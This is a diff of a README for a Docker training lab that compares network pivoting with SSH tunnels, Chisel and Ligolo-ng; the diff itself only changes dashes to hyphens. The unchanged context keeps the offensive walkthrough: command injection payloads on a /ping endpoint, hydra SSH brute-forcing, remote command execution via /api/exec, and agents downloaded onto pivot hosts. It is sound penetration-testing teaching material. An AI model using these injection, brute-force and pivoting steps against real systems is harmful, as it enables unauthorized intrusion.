@@ -1,4 +1,4 @@
-# Pivoting Lab — SSH vs Chisel vs Ligolo-ng
+# Pivoting Lab - SSH vs Chisel vs Ligolo-ng
 
 A Docker-based training lab for practicing network pivoting through three isolated network segments using three different tunneling methods.
 
@@ -20,7 +20,7 @@ Net A (10.10.1.0/24)       Net B (10.10.2.0/24)       Net C (10.10.3.0/24)
 └──────────────┘  └──────────────────┘  └──────────────────┘  └──────────────┘
 ```
 
-**Key design choice:** Pivot2 has **no SSH server**. This is deliberate — it's where the three tunneling methods diverge in difficulty and where Chisel and Ligolo-ng really prove their value.
+**Key design choice:** Pivot2 has **no SSH server**. This is deliberate - it's where the three tunneling methods diverge in difficulty and where Chisel and Ligolo-ng really prove their value.
 
 ## Quick Start
 
@@ -54,10 +54,10 @@ docker compose down
 
 ## Tips Before You Start
 
-- **Use tmux** — you'll need multiple terminals. The attacker has tmux installed. `tmux` to start, `Ctrl+B %` to split vertically, `Ctrl+B ←/→` to switch panes.
-- **Backgrounding processes** — any long-running process started via SSH or the `/api/exec` endpoint needs the full `nohup ... > /dev/null 2>&1 &` treatment, or your terminal will hang.
+- **Use tmux** - you'll need multiple terminals. The attacker has tmux installed. `tmux` to start, `Ctrl+B %` to split vertically, `Ctrl+B ←/→` to switch panes.
+- **Backgrounding processes** - any long-running process started via SSH or the `/api/exec` endpoint needs the full `nohup ... > /dev/null 2>&1 &` treatment, or your terminal will hang.
 - **The `/api/exec` endpoint** uses HTTP form encoding. This means `+` becomes a space and `&` becomes a parameter separator. Use `%2B` for `+` signs, and use `--data-urlencode` instead of `-d` when your command contains `&`.
-- **Clean up between methods** — kill all tunnel processes before starting a new method (instructions provided between each section).
+- **Clean up between methods** - kill all tunnel processes before starting a new method (instructions provided between each section).
 
 ---
 
@@ -75,7 +75,7 @@ You'll find port 22 (SSH) and port 5000 (HTTP).
 
 ### Exploit pivot1 (two paths)
 
-**Path A — Command Injection:**
+**Path A - Command Injection:**
 Visit `http://10.10.1.20:5000` with curl. The NetDiag app has an OS command injection vulnerability in the `/ping` endpoint:
 
 ```bash
@@ -86,20 +86,20 @@ curl "http://10.10.1.20:5000/ping?host=;id"
 curl "http://10.10.1.20:5000/ping?host=;ip%20addr"
 ```
 
-**Path B — Brute-force SSH:**
+**Path B - Brute-force SSH:**
 
 ```bash
 hydra -l root -P /opt/wordlists/wordlist.txt ssh://10.10.1.20
 # Then: ssh root@10.10.1.20
 ```
 
-Both paths get you access to pivot1. From here, `ip addr` shows two interfaces — 10.10.1.20 (Net A) and 10.10.2.20 (Net B). Time to pivot.
+Both paths get you access to pivot1. From here, `ip addr` shows two interfaces - 10.10.1.20 (Net A) and 10.10.2.20 (Net B). Time to pivot.
 
 ---
 
 ## Method 1: SSH Tunneling + Proxychains (Traditional)
 
-### First Pivot — Attacker → Net B
+### First Pivot - Attacker → Net B
 
 Set up a SOCKS proxy through pivot1:
 
@@ -125,7 +125,7 @@ proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=id'
 proxychains4 curl -X POST http://10.10.2.30:8080/api/exec -d 'cmd=ip%20addr'
 ```
 
-### Second Pivot — Reaching Net C (the hard way)
+### Second Pivot - Reaching Net C (the hard way)
 
 This is where SSH tunneling gets painful. Pivot2 has **no SSH**, so you can't just chain another `-D`. Instead, you need local port forwards:
 
@@ -145,9 +145,9 @@ curl -X POST http://localhost:8080/api/exec \
   --data-urlencode 'cmd=curl -s http://10.10.3.40'
 ```
 
-You should see the SecretVault page with the flag. But notice — you can't interact with Net C directly from your attacker. You're running commands on pivot2 and reading stdout. For a real pentest, this gets unwieldy fast with SSH alone.
+You should see the SecretVault page with the flag. But notice - you can't interact with Net C directly from your attacker. You're running commands on pivot2 and reading stdout. For a real pentest, this gets unwieldy fast with SSH alone.
 
-### Cleanup — before moving to Method 2
+### Cleanup - before moving to Method 2
 
 ```bash
 pkill -f "ssh -D"
@@ -159,7 +159,7 @@ pkill -f "ssh -N"
 
 ## Method 2: Chisel (SOCKS over HTTP)
 
-### First Pivot — Attacker → Net B
+### First Pivot - Attacker → Net B
 
 Start the chisel server on the attacker and deliver the client to pivot1:
 
@@ -187,7 +187,7 @@ proxychains4 nmap -sT -Pn -F 10.10.2.30
 proxychains4 curl http://10.10.2.30:8080/api/health
 ```
 
-### Second Pivot — Reaching Net C
+### Second Pivot - Reaching Net C
 
 Pivot2 can't reach the attacker's chisel server directly (it's on Net B, not Net A). Relay the chisel server port through pivot1 using SSH remote port forwarding:
 
@@ -211,7 +211,7 @@ proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
   -d 'cmd=chmod %2Bx /tmp/chisel'
 ```
 
-Run the chisel client on pivot2 (SOCKS on a different port — 1081):
+Run the chisel client on pivot2 (SOCKS on a different port - 1081):
 
 ```bash
 proxychains4 curl -X POST http://10.10.2.30:8080/api/exec \
@@ -228,7 +228,7 @@ proxychains4 -f <(echo -e "strict_chain\nproxy_dns\n[ProxyList]\nsocks5 127.0.0.
 
 > **Note:** Even with Chisel, the double pivot still required an SSH remote port forward to relay the connection. You end up mixing tools. Ligolo-ng handles this entirely within its own framework.
 
-### Cleanup — before moving to Method 3
+### Cleanup - before moving to Method 3
 
 ```bash
 pkill -f "ssh -R"
@@ -242,9 +242,9 @@ ssh root@10.10.1.20 "pkill -f chisel; pkill -f http.server" 2>/dev/null
 
 ## Method 3: Ligolo-ng (TUN Interface)
 
-This is the cleanest approach — no proxychains, no SOCKS, tools just work natively.
+This is the cleanest approach - no proxychains, no SOCKS, tools just work natively.
 
-### First Pivot — Attacker → Net B
+### First Pivot - Attacker → Net B
 
 Set up the Ligolo-ng proxy on the attacker:
 
@@ -287,14 +287,14 @@ In another terminal, add the route for Net B:
 ip route add 10.10.2.0/24 dev ligolo
 ```
 
-Now you can hit Net B directly — no proxychains:
+Now you can hit Net B directly - no proxychains:
 
 ```bash
 nmap -sT -Pn -F 10.10.2.30
 curl http://10.10.2.30:8080/api/health
 ```
 
-### Second Pivot — Reaching Net C
+### Second Pivot - Reaching Net C
 
 Set up listeners on the pivot1 session to relay both the agent binary and the agent connection:
 
@@ -307,7 +307,7 @@ ligolo-ng » listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:8000 --tcp
 ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
 ```
 
-Download and run the agent on pivot2 (no proxychains needed — you're going through the TUN interface):
+Download and run the agent on pivot2 (no proxychains needed - you're going through the TUN interface):
 
 ```bash
 # Download agent onto pivot2 via pivot1's listener
@@ -379,7 +379,7 @@ Make sure the attacker container has `cap_add: NET_ADMIN` and `/dev/net/tun` in 
 Long-running processes need `nohup ... > /dev/null 2>&1 &` to fully detach. Without it, SSH or subprocess.run() blocks waiting for stdout/stderr to close.
 
 **"Permission denied" when running downloaded binaries on pivot2:**
-You need to `chmod +x` first — but the `+` gets URL-decoded as a space through `/api/exec`. Use `chmod %2Bx /tmp/<binary>` instead.
+You need to `chmod +x` first - but the `+` gets URL-decoded as a space through `/api/exec`. Use `chmod %2Bx /tmp/<binary>` instead.
 
 **"Syntax error: end of file unexpected" from /api/exec:**
 Your command contains `&` characters that curl interprets as form data separators. Use `--data-urlencode` instead of `-d`.
@@ -401,7 +401,7 @@ Use IP addresses directly. DNS isn't configured between the lab networks.
 
 ## License
 
-MIT License — see LICENSE file for details.
+MIT License - see LICENSE file for details.
 
 ## Credits
 
